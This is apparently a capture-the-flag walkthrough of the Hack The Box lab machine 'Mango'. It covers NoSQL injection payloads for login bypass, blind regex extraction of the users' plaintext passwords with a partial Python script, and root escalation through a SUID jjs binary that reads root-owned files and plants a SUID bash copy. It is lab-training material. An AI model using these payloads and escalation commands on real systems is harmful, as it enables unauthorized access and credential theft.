# Hack The Box: Mango

**Difficulty:** Medium
**OS:** Linux

Mango is a Medium-level Linux machine demonstrating the severity of NoSQL injection vulnerabilities. The initial foothold is acquired by exploiting an authentication bypass and data extraction flaw in a MongoDB-backed web application via NoSQL injection. Privilege escalation involves pivoting between users using extracted credentials and abusing a SUID binary with Java dependencies to obtain a root shell.

---

## Reconnaissance

The assessment starts with an Nmap scan to enumerate the available network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.162
nmap -p 22,80,443 -sCV 10.10.10.162
```

The scan reveals three open ports:
*   **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.29)
*   **Port 443:** HTTPS (Apache httpd 2.4.29)

Browsing to port 80 redirects to HTTPS on port 443. The web page displays a simple search engine interface. 

Inspecting the SSL/TLS certificate for the HTTPS service reveals an interesting Subject Alternative Name (SAN): `staging-order.mango.htb`. 

We add both `mango.htb` and `staging-order.mango.htb` to our local `/etc/hosts` file.

```bash
echo "10.10.10.162 mango.htb staging-order.mango.htb" >> /etc/hosts
```

Navigating to `staging-order.mango.htb` presents a login portal.

## Web Exploitation

The login portal requires a username and password. The machine name "Mango" strongly hints at the backend database being MongoDB, which relies on NoSQL document storage rather than relational tables.

### NoSQL Injection (Authentication Bypass)

Unlike SQL, which is manipulated via string concatenation, NoSQL (specifically MongoDB) injection often involves manipulating JSON objects and query operators passed to the backend API.

We intercept a login request using a proxy like Burp Suite. The POST request sends the credentials as form data. We can test for authentication bypass by injecting NoSQL evaluation operators, such as `$ne` (not equal) or `$regex`.

If the backend logic is implemented insecurely (e.g., using PHP without proper type sanitization), we can transform the standard parameters into associative arrays representing MongoDB operators.

We modify the login payload to check if the password is *not equal* to an empty string:

```text
username[$ne]=admin&password[$ne]=&login=login
```

Sending this request successfully bypasses authentication and logs us into the application, confirming the NoSQL injection vulnerability. However, the portal itself offers limited functionality.

### NoSQL Injection (Data Extraction)

To gain access to the underlying system via SSH, we need valid credentials. Since we know the login form is vulnerable, we can use a Boolean-based blind NoSQL injection approach to extract the usernames and passwords character by character.

We use the `$regex` operator to ask the database true/false questions. For example, we ask: "Does a username start with 'a'?"

```text
username[$regex]=^a&password[$ne]=&login=login
```

If the application returns a success or redirect response, the condition is true. If it returns an error, the condition is false.

Due to the tedious nature of extracting full strings character by character, we write a Python script to automate the process.

```python
import requests
import string

url = "http://staging-order.mango.htb/"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
chars = string.ascii_letters + string.digits + string.punctuation

# Example logic for extracting usernames
valid_users = []
for c in chars:
    payload = f"username[$regex]=^{c}&password[$ne]=&login=login"
    r = requests.post(url, data=payload, headers=headers, allow_redirects=False)
    if r.status_code == 302:
        # Character is valid, continue brute-forcing the rest of the string
        # ...
```

The automated script successfully extracts two usernames and their corresponding plaintext passwords:
*   `mango: h3mXK8RhU~f{]f5H`
*   `admin: t9KcS3>!0B#2`

## Initial Access

We use the extracted credentials to authenticate via SSH. 

```bash
ssh mango@10.10.10.162
# Authentication successful
```

Logging in as `mango` is successful, but this user does not have access to the `user.txt` flag. We pivot to the `admin` user using the `su` command and the second set of extracted credentials.

```bash
su admin
Password: t9KcS3>!0B#2
```

As the `admin` user, we can read the `user.txt` flag from the home directory.

## Privilege Escalation

Enumerating the system for privilege escalation vectors, we search for binaries with the SUID bit set, indicating they execute with the permissions of their owner (root).

```bash
find / -perm -4000 2>/dev/null
```

The output reveals an unusual binary: `/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs`.

### Abusing the `jjs` SUID Binary

The `jjs` tool is a command-line interpreter for the Nashorn JavaScript engine, which is included with older versions of the Java Development Kit (JDK). Because it has the SUID bit set, any JavaScript code executed by `jjs` runs with root privileges.

We can invoke `jjs` interactively or pass it a script to read arbitrary files or execute system commands.

We use `jjs` to read the `root.txt` flag directly using Java's built-in file IO classes accessible via Nashorn:

```bash
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
# Outputs the root flag
```

Alternatively, we can use `jjs` to execute system commands to spawn a root shell or add our SSH key to the root user's `authorized_keys` file.

```javascript
jjs> var Runtime = Java.type("java.lang.Runtime");
jjs> Runtime.getRuntime().exec("/bin/sh -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'");
```

Executing the newly created SUID bash binary grants an interactive root shell.

```bash
/tmp/rootbash -p
# id
uid=0(root) gid=1000(admin) euid=0(root) groups=1000(admin)
```

The machine is fully compromised.
